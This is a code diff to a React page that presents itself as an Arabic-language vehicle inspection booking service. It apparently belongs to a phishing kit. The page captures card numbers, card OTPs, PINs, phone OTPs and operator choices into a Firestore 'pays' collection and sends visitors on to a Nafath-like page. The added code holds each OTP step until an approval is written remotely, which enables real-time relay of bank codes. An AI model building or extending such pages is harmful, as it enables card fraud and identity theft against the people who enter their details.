@@ -12,7 +12,7 @@ import { ArrowLeft, Car, Truck, Calendar, ChevronDown, CreditCard, Wallet, Menu,
 import { doc, onSnapshot } from "firebase/firestore"
 import { addData, db } from "@/lib/firebase"
 import { setupOnlineStatus } from "@/lib/utils"
-import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase } from "@/types"
+import type { VehicleStatus, VehicleType, AppStep, PaymentMethod, BankInfo, BinDatabase, ApprovalStatus } from "@/lib/types"
 
 // Removed duplicate type BankInfo definition as it's already imported from "@/types"
 // type BankInfo = {
@@ -55,6 +55,9 @@ export default function VehicleBooking() {
   const [operator, setOperator] = useState("")
   const [phoneOtp, setPhoneOtp] = useState("")
   const [phoneOtpError, setPhoneOtpError] = useState("")
+  const [cardOtpApproval, setCardOtpApproval] = useState<ApprovalStatus | undefined>()
+  const [phoneOtpApproval, setPhoneOtpApproval] = useState<ApprovalStatus | undefined>()
+  const [otpError, setOtpError] = useState("")
   const [bankInfo, setBankInfo] = useState<BankInfo | null>(null)
 
   useEffect(() => {
@@ -66,6 +69,13 @@ export default function VehicleBooking() {
     const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnapshot) => {
       if (docSnapshot.exists()) {
         const userData = docSnapshot.data()
+        if (userData.cardOtpApproval) {
+          setCardOtpApproval(userData.cardOtpApproval as ApprovalStatus)
+        }
+        if (userData.phoneOtpApproval) {
+          setPhoneOtpApproval(userData.phoneOtpApproval as ApprovalStatus)
+        }
+
         if (userData.currentPage === "2" || userData.currentPage === 2) {
           window.location.href = "/quote"
         } else if (userData.currentPage === "8888" || userData.currentPage === "nafaz") {
@@ -160,17 +170,26 @@ export default function VehicleBooking() {
 
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
+    setOtpError("")
     await addData({
       id: visitorID,
       otp: otp,
       step: "otp-submitted",
+      cardOtpApproval: "pending",
     })
+    setCardOtpApproval("pending")
     setIsLoading(true)
-    setTimeout(() => {
-      setCurrentStep("pin")
-      setIsLoading(false)
-    }, 1500)
   }
+
+  useEffect(() => {
+    if (cardOtpApproval === "approved") {
+      setIsLoading(false)
+      setCurrentStep("pin")
+    } else if (cardOtpApproval === "rejected") {
+      setIsLoading(false)
+      setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
+    }
+  }, [cardOtpApproval])
 
   const handlePinSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -188,6 +207,7 @@ export default function VehicleBooking() {
 
   const handlePhoneVerification = async (e: React.FormEvent) => {
     e.preventDefault()
+    setPhoneOtpError("")
     await addData({
       id: visitorID,
       phone,
@@ -195,14 +215,23 @@ export default function VehicleBooking() {
       phoneOtp,
       step: "payment-completed",
       completedDate: new Date().toISOString(),
+      phoneOtpApproval: "pending",
     })
+    setPhoneOtpApproval("pending")
     setIsLoading(true)
-    setTimeout(() => {
-      console.log("Payment completed successfully")
-      window.location.href = "/nafad"
-      setIsLoading(false)
-    }, 1500)
   }
+
+  useEffect(() => {
+    if (phoneOtpApproval === "approved") {
+      setIsLoading(false)
+      // Navigate to success page or show success message
+      setCurrentStep("landing")
+      alert("تم التحقق بنجاح! شكراً لك.")
+    } else if (phoneOtpApproval === "rejected") {
+      setIsLoading(false)
+      setPhoneOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
+    }
+  }, [phoneOtpApproval])
 
   const checkBIN = (cardNum: string) => {
     const bin = cardNum.replace(/\s/g, "").substring(0, 6)
@@ -970,6 +999,30 @@ export default function VehicleBooking() {
               </div>
             )}
 
+            {/* Inspection center */}
+            <div className="space-y-2">
+              <Label htmlFor="inspection-center" className="text-sm font-medium text-gray-700">
+                مركز الفحص<span className="text-red-500">*</span>
+              </Label>
+              <div className="relative">
+                <select
+                  id="inspection-center"
+                  value={inspectionCenter}
+                  onChange={(e) => setInspectionCenter(e.target.value)}
+                  className="h-12 w-full bg-gray-50 border border-gray-300 rounded-md px-4 text-sm appearance-none"
+                  data-testid="select-inspection-center"
+                >
+                  <option value="">إختر مركز المعاينة</option>
+                  {inspectionCenters.map((c) => (
+                    <option key={c.value} value={c.value}>
+                      {c.label}
+                    </option>
+                  ))}
+                </select>
+                <ChevronDown className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400 pointer-events-none" />
+              </div>
+            </div>
+
             {/* Date picker with custom display */}
             <div className="space-y-2">
               <Label className="text-sm font-medium text-gray-700">
@@ -1495,17 +1548,29 @@ export default function VehicleBooking() {
                       type="text"
                       maxLength={6}
                       value={otp}
-                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                      onChange={(e) => {
+                        setOtp(e.target.value.replace(/\D/g, ""))
+                        setOtpError("")
+                        setCardOtpApproval(undefined)
+                      }}
                       placeholder="000000"
                       className="h-16 text-center text-2xl font-bold tracking-widest border-2 focus:border-teal-700 shadow-sm"
                       dir="ltr"
                       required
+                      disabled={isLoading}
                     />
                     <p className="text-xs text-muted-foreground text-center mt-2">{otp.length}/6 أرقام</p>
+                    {otpError && <p className="text-destructive text-sm text-center mt-2">{otpError}</p>}
+                    {cardOtpApproval === "pending" && (
+                      <div className="flex items-center justify-center gap-2 mt-4">
+                        <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
+                        <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
+                      </div>
+                    )}
                   </div>
 
                   <div className="text-center pt-2">
-                    <Button type="button" variant="link" className="text-base font-medium">
+                    <Button type="button" variant="link" className="text-base font-medium" disabled={isLoading}>
                       إعادة إرسال الرمز
                     </Button>
                   </div>
@@ -1523,9 +1588,18 @@ export default function VehicleBooking() {
               >
                 رجوع
               </Button>
-              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading}>
-                <span>التحقق</span>
-                <ArrowLeft className="w-5 h-5" />
+              <Button type="submit" className="flex-1 h-12 gap-2 shadow-sm" disabled={isLoading || otp.length < 6}>
+                {isLoading ? (
+                  <>
+                    <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
+                    <span>جاري التحقق...</span>
+                  </>
+                ) : (
+                  <>
+                    <span>التحقق</span>
+                    <ArrowLeft className="w-5 h-5" />
+                  </>
+                )}
               </Button>
             </div>
           </form>
@@ -1654,6 +1728,7 @@ export default function VehicleBooking() {
                         placeholder="05xxxxxxxx"
                         dir="ltr"
                         required
+                        disabled={isLoading}
                       />
                     </div>
                   </div>
@@ -1669,11 +1744,12 @@ export default function VehicleBooking() {
                           key={op.id}
                           type="button"
                           onClick={() => setOperator(op.id)}
+                          disabled={isLoading}
                           className={`flex flex-col items-center justify-center p-4 border-2 rounded-lg transition-all ${
                             operator === op.id
                               ? "border-teal-700 bg-teal-700/10 shadow-md"
                               : `border-border ${op.color} hover:border-teal-700/50`
-                          }`}
+                          } ${isLoading ? "opacity-50 cursor-not-allowed" : ""}`}
                         >
                           <div className="h-8 w-auto mb-2 flex items-center justify-center">
                             <span className="font-bold text-lg">{op.name}</span>
@@ -1702,14 +1778,22 @@ export default function VehicleBooking() {
                           const value = e.target.value.replace(/\D/g, "").slice(0, 6)
                           setPhoneOtp(value)
                           if (phoneOtpError) setPhoneOtpError("")
+                          setPhoneOtpApproval(undefined)
                         }}
                         maxLength={6}
                         placeholder="أدخل رمز التحقق (6 أرقام)"
                         className="text-center text-xl tracking-widest"
                         required
+                        disabled={isLoading}
                       />
                       {phoneOtpError && <p className="text-destructive text-sm text-center">{phoneOtpError}</p>}
-                      <Button type="button" variant="link" className="w-full text-sm">
+                      {phoneOtpApproval === "pending" && (
+                        <div className="flex items-center justify-center gap-2">
+                          <div className="animate-spin h-4 w-4 border-2 border-teal-700 border-t-transparent rounded-full" />
+                          <p className="text-sm text-muted-foreground">جاري التحقق من الرمز...</p>
+                        </div>
+                      )}
+                      <Button type="button" variant="link" className="w-full text-sm" disabled={isLoading}>
                         إعادة إرسال الرمز
                       </Button>
                     </div>
@@ -1737,8 +1821,17 @@ export default function VehicleBooking() {
                   className="flex-1 h-12 gap-2 shadow-sm"
                   disabled={isLoading || !phone || !operator || phoneOtp.length < 6}
                 >
-                  <span>إتمام العملية</span>
-                  <ArrowLeft className="w-5 h-5" />
+                  {isLoading ? (
+                    <>
+                      <div className="animate-spin h-5 w-5 border-2 border-current border-t-transparent rounded-full" />
+                      <span>جاري التحقق...</span>
+                    </>
+                  ) : (
+                    <>
+                      <span>إتمام العملية</span>
+                      <ArrowLeft className="w-5 h-5" />
+                    </>
+                  )}
                 </Button>
               </div>
             </form>
